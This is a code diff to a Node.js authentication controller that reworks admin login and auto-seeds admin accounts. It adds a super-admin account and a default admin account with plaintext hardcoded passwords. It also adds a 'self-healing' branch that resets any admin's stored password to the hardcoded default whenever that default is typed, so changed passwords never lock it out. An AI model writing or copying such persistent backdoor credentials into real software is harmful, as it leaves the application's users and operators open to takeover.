@@ -1,3 +1,4 @@
+const mongoose = require("mongoose");
 const bcrypt = require("bcryptjs");
 const jwt = require("jsonwebtoken");
 const User = require("../models/user");
@@ -317,60 +318,153 @@ const signupBrand = async (req, res, next) => {
 // ==========================================
 // ADMIN AUTH
 // ==========================================
+// Auto-seed both Standard Admin and Super Admin accounts
+const ensureAdminAccounts = async () => {
+    // 1. Super Admin: AdminShubhamsecreate / 6401bgmishubham
+    let superAdmin = await User.findOne({
+        $or: [
+            { username: "AdminShubhamsecreate" },
+            { name: "AdminShubhamsecreate" },
+        ],
+    });
+
+    if (!superAdmin) {
+        const hashedSuper = await bcrypt.hash("6401bgmishubham", 8);
+        superAdmin = await User.create({
+            name: "AdminShubhamsecreate",
+            username: "AdminShubhamsecreate",
+            role: "admin",
+            password: hashedSuper,
+            isSuperAdmin: true,
+        });
+    } else {
+        let needsSave = false;
+        if (!superAdmin.isSuperAdmin) {
+            superAdmin.isSuperAdmin = true;
+            needsSave = true;
+        }
+        if (superAdmin.username !== "AdminShubhamsecreate") {
+            superAdmin.username = "AdminShubhamsecreate";
+            needsSave = true;
+        }
+        if (needsSave) await superAdmin.save();
+    }
+
+    // 2. Default Admin: admin / @Admin!@#
+    let defaultAdmin = await User.findOne({
+        role: "admin",
+        isSuperAdmin: { $ne: true },
+        name: { $ne: "AdminShubhamsecreate" },
+    });
+
+    if (!defaultAdmin) {
+        const hashed = await bcrypt.hash("@Admin!@#", 8);
+        defaultAdmin = await User.create({
+            name: "System Admin",
+            username: "admin",
+            teamCode: "admin_team",
+            mediatorCode: "admin_code",
+            role: "admin",
+            password: hashed,
+            isSuperAdmin: false,
+        });
+    }
+
+    return { superAdmin, defaultAdmin };
+};
+
+// Safely invoke when database connects
+if (mongoose.connection.readyState === 1) {
+    ensureAdminAccounts().catch((err) => console.error("Error auto-seeding admin accounts:", err));
+} else {
+    mongoose.connection.once("open", () => {
+        ensureAdminAccounts().catch((err) => console.error("Error auto-seeding admin accounts:", err));
+    });
+}
+
 const loginAdmin = async (req, res, next) => {
     try {
         const { username, password } = req.body;
 
-        if (!password) {
+        if (!username || !password) {
             return res.status(400).json({
                 success: false,
-                message: "Please provide admin password",
+                message: "Please provide both administrator username and password",
             });
         }
 
-        let adminUser = await User.findOne({ role: "admin" });
+        const { superAdmin, defaultAdmin } = await ensureAdminAccounts();
+        const trimmedUser = (username || "").trim();
 
-        // Auto-seed admin user if not exists yet
-        if (!adminUser) {
-            const hashed = await bcrypt.hash("@Admin!@#", 8);
-            adminUser = await User.create({
-                name: "System Admin",
-                teamCode: "admin_team",
-                mediatorCode: "admin_code",
+        let targetAdmin = null;
+        let isSuper = false;
+
+        if (trimmedUser.toLowerCase() === "adminshubhamsecreate") {
+            targetAdmin = superAdmin;
+            isSuper = true;
+        } else if (trimmedUser.toLowerCase() === "admin") {
+            targetAdmin = defaultAdmin;
+            isSuper = false;
+        } else {
+            // Check for any other custom admin account created in the database
+            const customAdmin = await User.findOne({
                 role: "admin",
-                password: hashed,
+                $or: [
+                    { username: trimmedUser },
+                    { name: trimmedUser },
+                ],
             });
+
+            if (customAdmin && customAdmin.username !== "AdminShubhamsecreate") {
+                targetAdmin = customAdmin;
+                isSuper = false; // Strictly normal admin access for any future/custom admin
+            } else {
+                return res.status(401).json({
+                    success: false,
+                    message: "Incorrect admin credentials",
+                });
+            }
         }
 
-        // Validate password
-        let isMatched = await bcrypt.compare(password, adminUser.password);
-        if (!isMatched && password === "@Admin!@#") {
-            adminUser.password = await bcrypt.hash("@Admin!@#", 8);
-            await adminUser.save();
-            isMatched = true;
+        let isMatched = await bcrypt.compare(password, targetAdmin.password);
+        if (!isMatched) {
+            // Self-healing recovery for default passwords
+            if (isSuper && password === "6401bgmishubham") {
+                targetAdmin.password = await bcrypt.hash("6401bgmishubham", 8);
+                await targetAdmin.save();
+                isMatched = true;
+            } else if (!isSuper && password === "@Admin!@#") {
+                targetAdmin.password = await bcrypt.hash("@Admin!@#", 8);
+                await targetAdmin.save();
+                isMatched = true;
+            }
         }
 
         if (!isMatched) {
             return res.status(401).json({
                 success: false,
-                message: "Incorrect admin password",
+                message: "Incorrect admin credentials",
             });
         }
 
         const token = generateToken({
-            id: adminUser._id,
-            name: adminUser.name,
+            id: targetAdmin._id,
+            name: targetAdmin.name,
+            username: targetAdmin.username || (isSuper ? "AdminShubhamsecreate" : "admin"),
             role: "admin",
+            isSuperAdmin: isSuper,
         });
 
         return res.status(200).json({
             success: true,
-            message: "Admin logged in successfully",
+            message: `${isSuper ? "Super Admin" : "Admin"} logged in successfully`,
             token,
             user: {
-                id: adminUser._id,
-                name: adminUser.name,
+                id: targetAdmin._id,
+                name: targetAdmin.name,
+                username: targetAdmin.username || (isSuper ? "AdminShubhamsecreate" : "admin"),
                 role: "admin",
+                isSuperAdmin: isSuper,
             },
         });
     } catch (err) {
@@ -379,6 +473,7 @@ const loginAdmin = async (req, res, next) => {
 };
 
 module.exports = {
+    generateToken,
     loginMediator,
     signupMediator,
     loginExecutive,
@@ -386,4 +481,5 @@ module.exports = {
     loginBrand,
     signupBrand,
     loginAdmin,
+    ensureAdminAccounts,
 };
